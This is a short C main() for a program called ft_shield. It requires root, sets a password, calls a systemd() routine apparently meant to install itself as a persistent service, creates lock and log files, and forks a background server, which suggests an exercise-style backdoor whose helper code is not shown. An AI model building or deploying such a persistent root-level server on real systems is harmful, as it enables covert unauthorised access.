#include "ft_shield.h"

int main(void) {
	if (getuid() || existing_lock() || !set_password()) {
		return (EXIT_FAILURE);
	}

	systemd();
	create_lock();
	create_log();
	pid_t pid = fork();
	if (pid == 0) {
		run_server();
	}
	printf(LOGIN);
	return(EXIT_SUCCESS);
}